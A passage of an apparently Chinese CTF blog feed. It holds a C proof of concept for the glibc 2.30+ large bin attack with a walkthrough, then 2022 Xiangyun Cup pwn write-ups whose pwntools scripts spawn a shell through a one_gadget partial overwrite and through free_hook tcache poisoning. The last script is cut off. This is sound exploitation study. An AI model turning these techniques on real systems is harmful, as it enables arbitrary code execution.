class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">A revisit to large bin attack for after glibc2.30</span></span><br><span class="line"><span class="comment">Relevant code snippet :</span></span><br><span class="line"><span class="comment">if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))&#123;</span></span><br><span class="line"><span class="comment">fwd = bck;</span></span><br><span class="line"><span class="comment">bck = bck-&gt;bk;</span></span><br><span class="line"><span class="comment">victim-&gt;fd_nextsize = fwd-&gt;fd;</span></span><br><span class="line"><span class="comment">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span></span><br><span class="line"><span class="comment">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="comment">/*Disable IO buffering to prevent stream from interfering with heap*/</span></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc2.30, two new checks have been enforced on large bin chunk insertion\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 1 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (nextsize)\&quot;);\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 2 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (bck-&gt;fd != fwd)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (bk)\&quot;);\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This prevents the traditional large bin attack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> target = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Here is the target we want to overwrite (%p) : %lu\n\n&quot;</span>,&amp;target,target);</span><br><span class="line">  <span class="keyword">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;First, we allocate a large chunk [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;And another chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We also allocate a second large chunk [p2]  (%p).\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This chunk should be smaller than [p1] and belong to the same large bin.\n&quot;</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Once again, allocate a guard chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the larger of the two --&gt; [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="keyword">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Allocate a chunk larger than [p1] to insert [p1] into large bin\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the smaller of the two --&gt; [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;At this point, we have one chunk in large bin [p1] (%p),\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;               and one chunk in unsorted bin [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p1[<span class="number">3</span>] = (<span class="keyword">size_t</span>)((&amp;target)<span class="number">-4</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n&quot;</span>,(&amp;target)<span class="number">-4</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n&quot;</span>, p2<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc does not check chunk-&gt;bk_nextsize if the new inserted chunk is smaller than smallest,\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;  the modified p1-&gt;bk_nextsize does not trigger any error\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Upon inserting [p2] (%p) into largebin, [p1](%p)-&gt;bk_nextsize-&gt;fd-&gt;nexsize is overwritten to address of [p2] (%p)\n&quot;</span>, p2<span class="number">-2</span>, p1<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n&quot;</span>, p2<span class="number">-2</span>, (<span class="keyword">void</span> *)target);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Target (%p) : %p\n&quot;</span>,&amp;target,(<span class="keyword">size_t</span>*)target);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line">  assert((<span class="keyword">size_t</span>)(p2<span class="number">-2</span>) == target);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先我们申请一个大小在<code>large bin</code>范围的<code>chunk</code> ,顺便申请一个小堆块以防合并</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;First, we allocate a large chunk [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line"><span class="keyword">size_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br></pre></td></tr></table></figure><p>然后我们申请一个比刚刚的申请的<code>chunk</code>要稍微小一点，但是属于同一个<code>bin</code>的大小的<code>chunk</code>，同样顺便申请一个小堆块以免合并</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We also allocate a second large chunk [p2]  (%p).\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This chunk should be smaller than [p1] and belong to the same large bin.\n&quot;</span>);</span><br><span class="line"><span class="keyword">size_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Once again, allocate a guard chunk to prevent consolidate\n&quot;</span>);</span><br></pre></td></tr></table></figure><p>然后我们<code>free</code>掉<code>p1</code>,并且申请一个比刚刚那俩都要大的<code>chunk</code>,使得被<code>free</code>的<code>p1</code>从<code>unsorted bin</code>放入<code>large bin</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(p1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Free the larger of the two --&gt; [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line"><span class="keyword">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Allocate a chunk larger than [p1] to insert [p1] into large bin\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br></pre></td></tr></table></figure><p>然后我们<code>free</code>掉<code>p2</code>，此时它被放入了<code>unsorted bin</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(p2);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Free the smaller of the two --&gt; [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;At this point, we have one chunk in large bin [p1] (%p),\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;               and one chunk in unsorted bin [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br></pre></td></tr></table></figure><p>然后通过UAF，修改<code>p1-&gt;bk_nextsize</code>为<code>[target-0x20]</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p1[<span class="number">3</span>] = (<span class="keyword">size_t</span>)((&amp;target)<span class="number">-4</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n&quot;</span>,(&amp;target)<span class="number">-4</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br></pre></td></tr></table></figure><p>之后再申请一个较大的<code>chunk</code>，让被<code>free</code>的<code>p2</code> 从<code>unsorted bin</code>放入<code>large bin</code> 就能让目标地址<code>target</code>写上堆<code>p2</code>的地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">assert((<span class="keyword">size_t</span>)(p2<span class="number">-2</span>) == target);</span><br></pre></td></tr></table></figure><p>具体过程我们可以回顾一下源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fwd = bck;</span><br><span class="line">bck = bck-&gt;bk;</span><br><span class="line">victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure><p>我们修改了<code>p1</code>的<code>bk_nextsize</code>为<code>[target-0x20]</code>,也就导致了<code>victim-&gt;bk_nextsize  = (&amp;target)-4)</code></p><p>然后执行<code>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</code>也就是<code>(&amp;target)-4)-&gt;fd_nextsize = victim</code> ,相当于<code>*target = victim</code> 就在<code>target</code>处写上了新入<code>large bin</code>的<code>p2</code>的地址</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里学习一下&lt;code&gt;large bin attack&lt;/code&gt;,主要是&lt;code&gt;glibc2.31&lt;/code&gt; 下面的利用&lt;/p&gt;
&lt;h2 id=&quot;源码分析&quot;&gt;&lt;a href=&quot;#源码分析&quot; class=&quot;headerlink&quot; title=&quot;源码分析&quot;&gt;&lt;/a</summary>
      
    
    
    
    
    <category term="pwn" scheme="http://phot0n.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>祥云杯2022wp</title>
    <link href="http://phot0n.com/2022/11/07/%E7%A5%A5%E4%BA%91%E6%9D%AF2022wp/"/>
    <id>http://phot0n.com/2022/11/07/%E7%A5%A5%E4%BA%91%E6%9D%AF2022wp/</id>
    <published>2022-11-07T05:06:06.000Z</published>
    <updated>2022-11-11T11:50:48.198Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="unexploitable"><a href="#unexploitable" class="headerlink" title="unexploitable"></a>unexploitable</h2><p>一道开了PIE的栈溢出题目,溢出字节是足够的</p><p><img src="https://s2.loli.net/2022/11/07/fV3HQ7cpy4axLhd.png" alt="unexp.png"></p><p>观察可以发现栈上残留了<code>__libc_start_main</code>也就是libc相关的地址，所以我们可以通过部分写覆盖低位改成<code>one_gadget</code>，但是这里离ret的地方有段距离，可以用<code>vsyscall</code>相关地址（因为即使开了PIE，这一部分的地址也是固定的，所以相当于一个ret衔接的作用）</p><p>这里我当时的方法是先部分写ret的地址覆盖低位改成<code>\xd1</code></p><p><img src="https://s2.loli.net/2022/11/07/npO5sRPZWBNqyai.png" alt="ida.png"></p><p>这样的话就没有<code>push</code>，最后ret的地址也会相应下移，然后部分写就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;INFO&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x4f2a5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f302 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a2fc execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#io = process(&quot;./unexploitable&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line">    pause()</span><br><span class="line">elf = ELF(<span class="string">&quot;./unexploitable&quot;</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;\xd1&#x27;</span></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;\xfc\xe2\x33&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io.send(payload1)</span></span><br><span class="line"><span class="comment">#io.send(payload2)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    io = process(<span class="string">&quot;./unexploitable&quot;</span>)</span><br><span class="line">    io.send(payload1)</span><br><span class="line">    io.send(payload2)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io.sendline(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">        io.recv()</span><br><span class="line">    <span class="keyword">except</span> Exception:     </span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">        io.interactive()</span><br></pre></td></tr></table></figure><p>不知道是不是脸黑，本地可以跑出来但是远程死活跑不出来（</p><p>而且有个问题是远程没开<code>setvbuf</code>（这个在一个未被调用的函数中），我也不知道是否有回显（</p><h2 id="bitheap"><a href="#bitheap" class="headerlink" title="bitheap"></a>bitheap</h2><p>漏洞是有一个off-by-null,准确来说是一个比特位</p><p><img src="https://s2.loli.net/2022/11/07/aZNnstli42QpjDd.png" alt="ld.png"></p><p>这里关注一下这个<code>my_read</code>函数</p><p><img src="https://s2.loli.net/2022/11/07/41SitxudhC7peRa.png" alt="my_read.png"></p><p>通过逆向或者调试可以知道这个函数的作用是类似一个hash函数，8个一组，然后每个取一位转化成一个字节表示。举个例子，11111111这8个字符就转化成0xff</p><p>这样的话其实利用起来感觉还要比off-by-null要稍微简单一点，因为off-by-null对块的大小有一定的要求，使得溢出去的空字节只修改pre_inuse位</p><p>那么思路就是off-by-null，先填满<code>tcache bin</code>(0-6),然后再free一个相同大小的使其落入<code>unsorted bin</code>(7)</p><p><img src="https://s2.loli.net/2022/11/07/VUNncwyICtT3W2S.png" alt=""></p><p>接下来利用溢出写8号堆块，然后修改下一个堆块也就是9号堆块的pre_size和pre_inuse位，pre_size写成前俩堆块加起来的大小(也就是0x120),然后pre_inuse位置0，这样对9号堆块free的时候就会有一个前向合并过程，让这三个堆块合起来放入unsorted bin，大小也就是三个合起来(0x90*3=0x1b0)</p><p><img src="https://s2.loli.net/2022/11/07/AORDj1WXwNkhMVd.png" alt=""></p><p>但是此时我们的8号堆块是可用的，所以我们先申请回所有的tcache bin的堆块，然后再申请同样大小的堆块时，就会对这个unsorted bin进行切割，这样libc地址就落入了8号堆块，再申请一次，同样大小的，就有两个指针指向8号堆块。这样先show出libc地址，然后delete掉，再用第二个指针进行UAF，打一个tcache poisoning到free hook附近，改写free hook为system地址，再free掉带有<code>/bin/sh</code>字符串的堆就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./bitheap&quot;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x4f2a5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f302 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a2fc execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">one = [<span class="number">0x4f2a5</span>,<span class="number">0x4f302</span>,<span class="number">0x10a2fc</span>]</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line">    pause()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choose</span>(<span class="params">index</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">index,size</span>):</span></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,str(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,str(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,str(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,str(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    <span class="comment">#return io.recvline()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    choose(<span class="number">4</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">translate</span>(<span class="params">s</span>):</span></span><br><span class="line">    ans = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        ans+=bin(i)[<span class="number">2</span>:].zfill(<span class="number">8</span>)[::<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">11</span>):</span><br><span class="line">    create(i,<span class="number">0x88</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">payload = <span class="string">b&#x27;1&#x27;</span>*(<span class="number">0x80</span>*<span class="number">8</span>)+<span class="string">b&#x27;00000100&#x27;</span>+<span class="string">b&#x27;10000000&#x27;</span>+<span class="string">b&#x27;00000000&#x27;</span>*<span class="number">6</span>+<span class="string">b&#x27;00000000&#x27;</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>,payload)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    create(i,<span class="number">0x88</span>)</span><br><span class="line">create(<span class="number">9</span>,<span class="number">0x88</span>) <span class="comment">#8 9</span></span><br><span class="line">create(<span class="number">11</span>,<span class="number">0x88</span>)</span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line">libc_base = u64(io.recvuntil(<span 